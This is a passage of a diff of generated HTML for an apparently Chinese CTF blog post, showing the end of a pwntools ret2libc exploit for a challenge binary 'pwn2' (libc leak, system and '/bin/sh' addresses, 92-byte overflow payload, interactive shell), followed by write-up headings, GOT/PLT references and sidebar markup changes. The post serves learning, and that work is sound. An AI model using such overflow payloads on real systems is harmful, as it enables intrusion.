hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="2-执行脚本"><a href="#2-执行脚本" class="headerlink" title="2.执行脚本"></a><font color="navy">2.执行脚本</font></h4><p><img src="/images/84-10.jpg" alt></p>
+<h4 id="3-查看当前目录下的文件夹"><a href="#3-查看当前目录下的文件夹" class="headerlink" title="3.查看当前目录下的文件夹"></a><font color="navy">3.查看当前目录下的文件夹</font></h4><p><img src="/images/84-11.jpg" alt></p>
+<h4 id="4-获取-flag"><a href="#4-获取-flag" class="headerlink" title="4.获取 flag"></a><font color="navy">4.获取 flag</font></h4><p><img src="/images/84-12.jpg" alt></p>
+<h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="brown">四、参考文章</font></h3><ul>
 <li><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">延迟绑定的实现</a></li>
 <li><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>★</li>
 <li><a href="https://www.zhihu.com/question/21249496" target="_blank" rel="noopener">Linux动态链接为什么要用PLT和GOT表？</a></li>
@@ -704,7 +699,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown一-基础知识font"><span class="toc-number">1.</span> <span class="toc-text"> 一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.GOT 表、PLT 表和 libc 库的相关知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2重定位font"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.重定位</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy3延迟绑定font"><span class="toc-number">2.</span> <span class="toc-text"> 3.延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown二-解题思路font"><span class="toc-number">3.</span> <span class="toc-text"> 二、解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1file-pwn2font"><span class="toc-number">3.1.</span> <span class="toc-text"> 1.file pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy2check-pwn2font"><span class="toc-number">4.</span> <span class="toc-text"> 2.check pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3ida-反编译-pwn2font"><span class="toc-number">4.1.</span> <span class="toc-text"> 3.IDA 反编译 pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy4解题思路font"><span class="toc-number">5.</span> <span class="toc-text"> 4.解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown三-解题步骤font"><span class="toc-number">6.</span> <span class="toc-text"> 三、解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1编写脚本font"><span class="toc-number">6.1.</span> <span class="toc-text"> 1.编写脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2执行脚本font"><span class="toc-number">6.2.</span> <span class="toc-text"> 2.执行脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3查看当前目录下的文件夹font"><span class="toc-number">6.3.</span> <span class="toc-text"> 3.查看当前目录下的文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy4获取-flagfont"><span class="toc-number">6.4.</span> <span class="toc-text"> 4.获取 flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown四-参考文章font"><span class="toc-number">7.</span> <span class="toc-text"> 四、参考文章</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、基础知识"><span class="toc-number">1.</span> <span class="toc-text">一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-GOT-表、PLT-表和-libc-库的相关知识"><span class="toc-number">1.1.</span> <span class="toc-text">1.GOT 表、PLT 表和 libc 库的相关知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-重定位"><span class="toc-number">1.2.</span> <span class="toc-text">2.重定位</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-延迟绑定"><span class="toc-number">2.</span> <span class="toc-text">3.延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、解题思路"><span class="toc-number">3.</span> <span class="toc-text">二、解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file-pwn2"><span class="toc-number">3.1.</span> <span class="toc-text">1.file pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-check-pwn2"><span class="toc-number">4.</span> <span class="toc-text">2.check pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-IDA-反编译-pwn2"><span class="toc-number">4.1.</span> <span class="toc-text">3.IDA 反编译 pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-解题思路"><span class="toc-number">5.</span> <span class="toc-text">4.解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、解题步骤"><span class="toc-number">6.</span> <span class="toc-text">三、解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-编写脚本"><span class="toc-number">6.1.</span> <span class="toc-text">1.编写脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-执行脚本"><span class="toc-number">6.2.</span> <span class="toc-text">2.执行脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-查看当前目录下的文件夹"><span class="toc-number">6.3.</span> <span class="toc-text">3.查看当前目录下的文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-获取-flag"><span class="toc-number">6.4.</span> <span class="toc-text">4.获取 flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、参考文章"><span class="toc-number">7.</span> <span class="toc-text">四、参考文章</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -717,6 +712,22 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2349,12 +2360,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 总结</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
         </li>
     
     
@@ -2839,21 +2850,21 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
     
-        <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
-    
         <span class="sidebar-tag-name" data-tags="《保密概论》"><span class="iconfont-archer">&#xe606;</span>《保密概论》</span>
+    
+        <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
     
         <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
     
         <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
     
-        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
-    
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
@@ -2861,25 +2872,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Virtual machine"><span class="iconfont-archer">&#xe606;</span>Virtual machine</span>
     
+        <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
+    
         <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
-    
-        <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
-    
-        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约漏洞"><span class="iconfont-archer">&#xe606;</span>智能合约漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
     
@@ -2888,10 +2903,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="内核"><span class="iconfont-archer">&#xe606;</span>内核</span>
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
-    
-        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
-    
-        <span class="sidebar-tag-name" data-tags="智能合约漏洞"><span class="iconfont-archer">&#xe606;</span>智能合约漏洞</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
